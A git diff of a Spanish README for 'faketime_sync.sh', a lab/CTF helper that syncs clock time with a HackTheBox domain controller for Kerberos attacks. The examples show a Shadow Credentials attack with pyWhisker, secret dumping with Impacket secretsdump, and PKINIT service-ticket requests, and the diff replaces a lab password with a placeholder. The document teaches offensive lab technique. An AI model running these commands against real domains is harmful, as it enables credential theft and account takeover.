@@ -1,80 +1,108 @@
-# 🕐 Faketime Sync
-
-Script para sincronizar la hora virtual con servicios remotos, obtener tickets Kerberos y ejecutar comandos de forma automatizada.
-
 ---
 
-## 📋 Uso general
-
+### 🔹 Mostrar solo la hora virtual (sin output extra)
 ```bash
-./faketime_sync.sh <IP> <DOMINIO> [USUARIO] [CONTRASEÑA] [OPCIÓN]
+./faketime_sync.sh 10.129.35.21 logging.htb --show-time
 ```
-
----
-
-## ⚡ Comandos disponibles
-
-### 🔹 Obtener solo la hora virtual
+Devuelve únicamente la hora, útil para scripts externos:
 ```bash
-./faketime_sync.sh 10.129.35.21 logging.htb
+DC_TIME=$(./faketime_sync.sh 10.129.35.21 logging.htb --show-time)
+faketime "$DC_TIME" kinit user@LOGGING.HTB
 ```
-Devuelve la hora virtual del sistema remoto.
 
 ---
 
 ### 🔹 Obtener TGT automáticamente
 ```bash
-./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --tgt
+./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Pass123' --tgt
 ```
-Solicita un **Ticket Granting Ticket (TGT)** para el usuario especificado.
+Obtiene un **Ticket Granting Ticket (TGT)** con la hora sincronizada.
+Equivale a:
+```bash
+faketime '2026-04-22 07:51:51' kinit svc_recovery@LOGGING.HTB
+```
 
 ---
 
-### 🔹 Obtener Shadow Credentials
+### 🔹 Shadow Credentials attack
 ```bash
-./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --shadow 'msa_health$'
+./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Pass123' --shadow 'msa_health$'
 ```
-Recupera las credenciales shadow de un usuario o servicio específico.
+Ejecuta **pyWhisker** con la hora virtual para agregar shadow credentials
+al target especificado. Requiere pyWhisker en `~/`.
 
 ---
 
-### 🔹 Ejecutar un comando personalizado
+### 🔹 Ejecutar comando personalizado
 ```bash
-./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --exec 'klist'
+./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Pass123' --exec 'klist'
 ```
-Ejecuta un comando utilizando las credenciales especificadas.
+Ejecuta cualquier comando bajo `faketime` con la hora del DC.
 
----
-
-### 🔹 Mostrar solo la hora virtual
+**Más ejemplos con --exec:**
 ```bash
-./faketime_sync.sh 10.129.35.21 logging.htb --show-time
+# Ver tickets activos
+--exec 'klist'
+
+# Volcar secretos con secretsdump
+--exec 'python3 /opt/impacket/examples/secretsdump.py \
+    -k -no-pass dc01.logging.htb'
+
+# Ejecutar pyWhisker manualmente
+--exec 'python3 ~/pywhisker/pywhisker.py -d logging.htb \
+    -u svc_recovery -p Pass123 --target msa_health$ \
+    --action list --dc-ip 10.129.35.21'
+
+# getST con PKINIT
+--exec 'python3 /opt/impacket/examples/getST.py \
+    -spn cifs/dc01.logging.htb \
+    -pfx-base64 $(cat cert.pfx.b64) \
+    logging.htb/msa_health$'
 ```
-Muestra únicamente la hora virtual sin realizar autenticaciones adicionales.
 
 ---
 
 ## 🗂️ Resumen de opciones
 
-| Opción | Descripción |
-|--------|-------------|
-| *(sin opción)* | Obtiene la hora virtual del host remoto |
-| `--tgt` | Solicita un Ticket Granting Ticket (TGT) |
-| `--shadow <usuario>` | Recupera Shadow Credentials del usuario indicado |
-| `--exec '<comando>'` | Ejecuta un comando personalizado con las credenciales dadas |
-| `--show-time` | Muestra solo la hora virtual, sin autenticación |
+| Opción | Args extra | Requiere creds | Descripción |
+|--------|-----------|----------------|-------------|
+| *(sin opción)* | — | No | Obtiene hora y muestra uso manual |
+| `--show-time` | — | No | Imprime solo la hora virtual |
+| `--tgt` | — | ✅ Sí | Solicita TGT con kinit |
+| `--shadow <target>` | `<target>` | ✅ Sí | Shadow Credentials via pyWhisker |
+| `--exec '<cmd>'` | `'<comando>'` | Opcional | Ejecuta cmd con faketime |
 
 ---
 
-## 📌 Requisitos
+## 🔍 Métodos de detección de hora
 
-- `faketime`
-- `impacket` (para operaciones Kerberos)
-- Acceso de red al host objetivo
+El script prueba en orden hasta obtener la hora del DC:
+
+| Prioridad | Método | Herramienta |
+|-----------|--------|-------------|
+| 1° | SMB timestamp | `nmap --script smb2-time` |
+| 2° | NTP offset | `ntpdate -q` |
+| 3° | LDAP currentTime | `ldapsearch` (requiere creds) |
+| 4° | Fallback | `+7h` hardcodeado |
 
 ---
 
-## ⚠️ Advertencia
+## 💡 Uso avanzado
 
-> Este script está pensado para uso en entornos de laboratorio y CTFs (ej. HackTheBox).  
-> No lo uses contra sistemas sin autorización explícita.
+```bash
+# Exportar hora para usar en otros scripts
+DC_TIME=$(./faketime_sync.sh 10.129.35.21 logging.htb --show-time)
+
+# Encadenar con impacket
+faketime "$DC_TIME" python3 getST.py ...
+
+# Usar config Kerberos generada
+KRB5_CONFIG=/tmp/krb5_faketime.conf faketime "$DC_TIME" klist
+```
+
+---
+
+## ⚠️ Nota
+
+> Diseñado para entornos de laboratorio y CTFs (HackTheBox, TryHackMe).  
+> No uses este script contra sistemas sin autorización explícita.
